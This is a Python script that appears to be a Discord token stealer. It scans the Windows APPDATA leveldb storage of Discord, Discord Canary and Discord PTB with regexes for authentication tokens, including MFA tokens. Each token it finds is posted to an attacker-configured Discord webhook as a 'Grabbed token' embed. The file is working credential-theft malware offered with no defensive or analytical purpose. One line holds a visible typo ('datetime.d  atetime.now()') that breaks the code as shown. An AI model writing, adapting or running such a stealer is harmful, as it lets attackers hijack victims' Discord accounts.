from requests import get
import os
import re
from discord_webhook import *
# import traiancrypt as tc
import datetime

# change these
webhook_url = "CHANGE ME"
# encryption_key = "IforgotTOtakeMYmeds"

# paths
roaming_path = os.getenv('APPDATA')
paths = {
    'discord': roaming_path + '\\discord\\',
    'discord canary': roaming_path + '\\discordcanary\\',
    'discord ptb': roaming_path + '\\discordptb\\',
}

# send the token to the webhook
def send_token(token):
    # token = tc.xrcrypt(token, encryption_key, 1)
    
    webhook = DiscordWebhook(url=webhook_url, username="grabby")
    
    date_and_time = str(datetime.d  atetime.now())
    embed = DiscordEmbed(title='Grabbed token', description=date_and_time, color='03b2f8')
    embed.set_timestamp()
    embed.add_embed_field(name='Token: ', value=token)
    webhook.add_embed(embed)
    
    response = webhook.execute()
    
    return response

# function to dig for the token in the found paths
def start_digging(paths):
    tokens = []
    
    for path in paths:
        try:
            path += "Local Storage\\leveldb"
            print("search in " + path)
            
            # search each file in path
            for file_name in os.listdir(path):
                print("searching in " + file_name)
                try:
                    with open(path + "\\" + file_name, 'r', encoding='unicode_escape', errors='ignore') as f:
                        for line in f:
                            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                                for token in re.findall(regex, line.strip()):
                                    # if "mfa." in token:
                                        # token = token.replace("mfa.", "")
                                    tokens.append(token)
                                    print("found token: " + token[:20] + " ... ")
                                    send_token(token)
                except:
                    None
        except FileNotFoundError:
            pass

# main script
if __name__ == '__main__':
    
    found = []
    
    # testing each path
    if not os.path.exists(roaming_path):
        print('Roaming path not found')
        print("PATH: {}".format(roaming_path))
        # fatal error
        exit(1)

    if not os.path.exists(paths['discord']):
        print('discord path not found!!!!!!!!!!!!!!!')
    else:
        found.append(paths['discord'])
        print("discord path found")
    
    if not os.path.exists(paths['discord canary']):
        print('discord canary path not found')
    else:
        found.append(paths['discord canary'])
        print("discord canary path found")
    
    if not os.path.exists(paths['discord ptb']):
        print('discord ptb path not found')
    else:
        found.append(paths['discord ptb'])
        print("discord ptb path found")
    
    if len(found) == 0:
        print('No discord paths found')
        # fatal error
        exit(1)
    else:
        # # check if encryptor is working
        # if not tc.dexrcrypt(tc.xrcrypt("test", encryption_key, 1), encryption_key, 1) == "test":
            # print("encryptor not working")
            # # fatal error
            # exit(1)
        # else:
            # print("encryptor working!")

        start_digging(found)

    # print("enter encrypted token to decrypt: ")
    # reveal = input("---> ")
    # print("token: " + tc.dexrcrypt(reveal, encryption_key, 1))